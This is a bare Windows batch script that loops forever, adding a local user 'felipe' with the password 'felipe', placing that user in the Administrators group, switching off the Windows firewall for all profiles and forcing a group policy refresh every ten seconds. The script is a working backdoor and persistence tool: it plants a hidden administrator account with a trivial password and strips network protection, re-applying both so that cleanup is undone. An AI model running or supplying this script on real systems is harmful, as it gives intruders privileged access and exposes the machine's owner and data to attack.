@echo off
:loop
net user felipe felipe /add
net localgroup Administrators felipe /add
netsh advfirewall set allprofiles state off
gpupdate /force
timeout /t 10 /nobreak
goto :loop
